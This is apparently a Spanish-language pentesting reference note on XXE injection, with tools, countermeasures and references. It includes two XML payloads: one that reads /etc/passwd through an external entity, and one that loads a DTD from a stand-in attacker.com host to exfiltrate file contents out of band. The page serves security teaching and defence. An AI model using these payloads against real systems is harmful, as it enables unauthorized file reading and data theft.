---
title: Análisis de XXE (XML External Entity)
slug: analisis-xxe
aliases: [XXE, XML External Entity, XML Injection, external entity injection, SYSTEM entity, DOCTYPE injection, file:// XXE, XML LFI, billion laughs, XML bomb, XInclude injection, defusedxml, DocumentBuilderFactory hardening, php://filter base64 XXE, blind XXE, parameter entity, error-based XXE, malicious external DTD, FileNotFoundException leak, double encoding XML, character entity reference, deferred entity expansion, Yunusov Osipov technique, XInclude, xi:include, parse=text XInclude, server-side XML construction, form-encoded XML injection, setXIncludeAware bypass, XInclude without DOCTYPE, SVG XXE, malicious SVG upload, file upload XXE, ImageTragick, image processor XXE, DOCX XXE, EPUB XXE, RSS XXE, hidden XML formats, visual exfiltration via SVG text, local DTD repurposing, ISOamso, docbookx.dtd, dtd-finder, parameter entity redefinition, numeric vs named entity in DTD, Xerces strict entity expansion, no infrastructure XXE, GoSecure dtd-finder]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [analisis-ssrf, analisis-deserialization, analisis-sqli]
learning_refs: [portswigger/exploiting-xxe-to-retrieve-files, portswigger/exploiting-xxe-to-perform-ssrf, portswigger/blind-xxe-data-retrieval-via-error-messages, portswigger/xinclude-attack-retrieve-files, portswigger/xxe-via-file-upload-svg, portswigger/xxe-trigger-error-via-local-dtd]
---

# Análisis de XXE (XML External Entity)

## Descripción
La inyección de entidades externas XML (XXE) ocurre cuando una aplicación procesa documentos XML que contienen referencias a entidades externas no validadas. Un atacante puede explotar un analizador XML débilmente configurado para leer archivos locales del servidor, realizar escaneos de puertos internos o incluso ejecutar ataques SSRF.

## Herramientas
- **Burp Suite** (Repeater) — para manipular estructuras XML y probar la resolución de entidades.
- **XXEInjector** — herramienta automatizada para explotar vulnerabilidades XXE y extraer datos.

## Comandos / Ejemplos

### Lectura de archivos locales (LFI)
```xml
<!-- DTD malicioso inyectado en la petición -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>admin</password>
</user>
# Resultado: El servidor devuelve el contenido de /etc/passwd en la respuesta.
```

### Exfiltración OOB (Out-of-Band)
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
# El archivo evil.dtd en el servidor del atacante enviará los datos capturados por DNS o HTTP.
```

## Contramedidas
- Deshabilitar el procesamiento de entidades externas y DTDs en todos los analizadores XML.
- Usar formatos de datos menos complejos como JSON siempre que sea posible.
- Validar y sanitizar las entradas XML utilizando esquemas XSD estrictos.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
